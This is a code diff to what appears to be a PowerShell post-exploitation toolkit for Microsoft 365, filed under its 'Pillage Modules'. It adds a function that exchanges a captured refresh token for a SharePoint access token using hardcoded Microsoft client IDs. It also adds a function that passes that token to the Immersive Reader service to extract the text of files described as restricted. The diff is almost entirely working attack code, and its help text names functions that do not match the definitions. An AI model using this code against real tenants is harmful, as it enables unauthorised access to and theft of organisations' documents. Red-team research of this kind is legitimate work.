@@ -454,7 +454,104 @@ $resources = @"
     }
 }
 
+function Invoke-RefreshToSharePointToken {
+    <#
+    .DESCRIPTION
+        Generate a Substrate token from a refresh token.
+    .EXAMPLE
+        Invoke-RefreshToSubstrateToken -domain myclient.org -refreshToken ey....
+        $SubstrateToken.access_token
+    #>
 
+    [cmdletbinding()]
+    Param([Parameter(Mandatory=$false)]
+    [string]$domain,
+    [Parameter(Mandatory=$false)]
+    [String]$ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+    )
+    
+
+    
+    $Headers=@{}
+    $Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)"
+    $Resource = "https://$($domain)/"
+    $authUrl = "https://login.microsoftonline.com/$($global:tenantid)"
+    
+    $refreshToken = $global:tokens.refresh_token
+    $body = @{
+        "resource" =      $Resource
+        "client_id" =     $ClientId
+        "grant_type" =    "refresh_token"
+        "refresh_token" = $refreshToken
+        "scope" = "openid"
+    }
+
+    $global:SharePointToken = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
+
+}
+
+function Invoke-ImmersiveReadFile{
+    <#
+     .SYNOPSIS
+        Simple module to read a file with the immersive reader.
+        Author: Steve Borosh (@424f424f)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+        
+       Simple module to read a file with the immersive reader.
+
+    .PARAMETER SharePointDomain
+
+        The target SharePoint domain. e.g. targetcompany.sharepoint.com
+    
+    .PARAMETER DriveID
+
+        The DriveID.
+
+    .PARAMETER FileID
+
+        The ID of the file to open.
+    
+    .EXAMPLE
+        
+        C:\PS> Invoke-ImmersiveFileReader -SharePointDomain targetcompany.sharepoint.com -DriveID <drive ID> -FileID <FileID>
+        Description
+        -----------
+        This command use the immersive reader to read a file.
+
+    #>
+
+    param(
+
+        [Parameter(Position = 1, Mandatory = $True)]
+        [string]
+        $SharePointDomain,
+        [Parameter(Position = 2, Mandatory = $True)]
+        [string]
+        $DriveID,
+        [Parameter(Position = 3, Mandatory = $True)]
+        [string]
+        $FileID
+    )
+    $Headers=@{}
+    $Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)"
+    $Headers["Host"] = 'southcentralus1-mediap.svc.ms'
+    $Headers["Accept-Language"] = "en-US"
+    
+    Invoke-RefreshToSharePointToken -domain $SharePointDomain -ClientId "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0"
+   
+    try {
+        $request = Invoke-WebRequest -UseBasicParsing -Headers $Headers -Method GET -Uri "https://southcentralus1-mediap.svc.ms/transform/imreader?provider=spo&inputFormat=txt&cs=fFNQTw&docid=https%3A%2F%2F$($SharePointDomain)%3A443%2F_api%2Fv2.0%2Fdrives%2F$($DriveID)%2Fitems%2F$($FileID)%3Fversion%3DPublished&access_token=$($global:SharePointToken.access_token)&nocache=true"
+        }catch{
+            $err = $_.Exception
+            $err
+        }
+        $out = $request.Content | ConvertFrom-Json
+        $out.data.t
+}
 function Invoke-DeleteOAuthApp{
     <#
      .SYNOPSIS
@@ -708,7 +805,6 @@ Function Invoke-CheckAccess{
     $out = $request.Content | ConvertFrom-Json
     $out
 }
-
 Function Invoke-RefreshAzureAppTokens{
     <#
      .SYNOPSIS
@@ -3551,7 +3647,6 @@ function Invoke-SearchSharePointAndOneDrive{
             $location = $hit.resource.webUrl
             $driveid = $hit.resource.parentReference.driveId
             $itemid = $hit.resource.id
-            
 
             $resultInfo = @{
                 result = $itemnumber
@@ -4135,6 +4230,7 @@ Invoke-AddGroupMember`t`t-`t Adds a member to a group
     Write-Host -ForegroundColor green "----------------------- Pillage Modules -----------------------"
     Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
     Write-Host -ForegroundColor green "Invoke-SearchSharePointAndOneDrive -`t Search across all SharePoint sites and OneDrive drives visible to the user
+Invoke-ImmersiveFileReader`t-`t Open restricted files with the immersive reader
 Invoke-SearchMailbox`t`t-`t Has the ability to do deep searches across a user’s mailbox and can export messages
 Invoke-SearchTeams`t`t-`t Can search all Teams messages in all channels that are readable by the current user.
 Invoke-SearchUserAttributes`t-`t Search for terms across all user attributes in a directory
